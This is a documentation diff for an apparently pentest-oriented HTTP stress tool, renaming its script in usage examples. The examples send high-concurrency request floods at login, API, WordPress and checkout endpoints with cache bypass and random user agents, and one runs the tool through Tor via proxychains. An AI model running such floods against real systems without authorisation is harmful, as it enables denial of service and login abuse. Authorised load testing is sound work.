-python3 main.py http://192.168.1.100 -n 100 -c 10
+python3 main-kali-linux.py http://192.168.1.100 -n 100 -c 10
 
 # Or add to /etc/hosts
 echo "192.168.1.100 target.com" | sudo tee -a /etc/hosts
@@ -1344,13 +1344,13 @@ sudo sysctl -w net.ipv4.tcp_timestamps=1
 
 ```bash
 # Run with Python debugging
-python3 -v main.py http://target.com -n 10 -c 2
+python3 -v main-kali-linux.py http://target.com -n 10 -c 2
 
 # Check for errors
-python3 main.py http://target.com -n 10 -c 2 2>&1 | tee debug.log
+python3 main-kali-linux.py http://target.com -n 10 -c 2 2>&1 | tee debug.log
 
 # Verbose output
-python3 -u main.py http://target.com -n 10 -c 2
+python3 -u main-kali-linux.py http://target.com -n 10 -c 2
 ```
 
 ---
@@ -1415,32 +1415,32 @@ wafw00f http://target.com
 
 ```bash
 # Step 1: Light reconnaissance
-python3 main.py http://target.com -n 50 -c 5
+python3 main-kali-linux.py http://target.com -n 50 -c 5
 
 # Step 2: If responsive, increase load
-python3 main.py http://target.com -n 500 -c 25 --no-cache
+python3 main-kali-linux.py http://target.com -n 500 -c 25 --no-cache
 
 # Step 3: Test specific endpoints found
-python3 main.py http://target.com/admin -n 200 -c 10 --no-cache
+python3 main-kali-linux.py http://target.com/admin -n 200 -c 10 --no-cache
 ```
 
 ### Scenario 2: API Security Assessment
 
 ```bash
 # Test API authentication
-python3 main.py http://target.com/api/v1/auth \
+python3 main-kali-linux.py http://target.com/api/v1/auth \
   -n 500 -c 25 -m POST \
   --body '{"username":"test","password":"test"}' \
   --no-cache
 
 # Test API rate limiting
-python3 main.py http://target.com/api/v1/data \
+python3 main-kali-linux.py http://target.com/api/v1/data \
   -n 2000 -c 100 \
   -H "Authorization: Bearer token123" \
   --no-cache
 
 # Test API without auth
-python3 main.py http://target.com/api/v1/users \
+python3 main-kali-linux.py http://target.com/api/v1/users \
   -n 1000 -c 50 --no-cache
 ```
 
@@ -1448,17 +1448,17 @@ python3 main.py http://target.com/api/v1/users \
 
 ```bash
 # Test product pages
-python3 main.py http://target.com/products \
+python3 main-kali-linux.py http://target.com/products \
   -n 2000 -c 100 --no-cache --random-ua
 
 # Test shopping cart
-python3 main.py http://target.com/cart \
+python3 main-kali-linux.py http://target.com/cart \
   -n 1000 -c 50 \
   -H "Cookie: session=test123" \
   --no-cache
 
 # Test checkout process
-python3 main.py http://target.com/checkout \
+python3 main-kali-linux.py http://target.com/checkout \
   -n 500 -c 25 -m POST \
   -H "Cookie: session=test123" \
   --body '{"payment":"card"}' \
@@ -1469,19 +1469,19 @@ python3 main.py http://target.com/checkout \
 
 ```bash
 # Test wp-login.php
-python3 main.py http://target.com/wp-login.php \
+python3 main-kali-linux.py http://target.com/wp-login.php \
   -n 500 -c 25 -m POST \
   --body "log=admin&pwd=test" \
   --no-cache
 
 # Test XML-RPC
-python3 main.py http://target.com/xmlrpc.php \
+python3 main-kali-linux.py http://target.com/xmlrpc.php \
   -n 500 -c 25 -m POST \
   -H "Content-Type: text/xml" \
   --no-cache
 
 # Test REST API
-python3 main.py http://target.com/wp-json/wp/v2/users \
+python3 main-kali-linux.py http://target.com/wp-json/wp/v2/users \
   -n 1000 -c 50 --no-cache
 ```
 
@@ -1489,14 +1489,14 @@ python3 main.py http://target.com/wp-json/wp/v2/users \
 
 ```bash
 # Simulate mobile app traffic
-python3 main.py http://target.com/api/mobile \
+python3 main-kali-linux.py http://target.com/api/mobile \
   -n 2000 -c 100 \
   -H "User-Agent: MyApp/1.0 (Android 11)" \
   -H "X-Device-ID: device123" \
   --no-cache
 
 # Test with mobile user agent
-python3 main.py http://target.com \
+python3 main-kali-linux.py http://target.com \
   -n 1000 -c 50 \
   -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)" \
   --no-cache
@@ -1516,7 +1516,7 @@ sudo openvpn client.ovpn
 curl ifconfig.me
 
 # Use Tor for additional anonymity (if authorized)
-proxychains python3 main.py http://target.com -n 100 -c 10
+proxychains python3 main-kali-linux.py http://target.com -n 100 -c 10
 ```
 
 ### 2. Evidence Collection
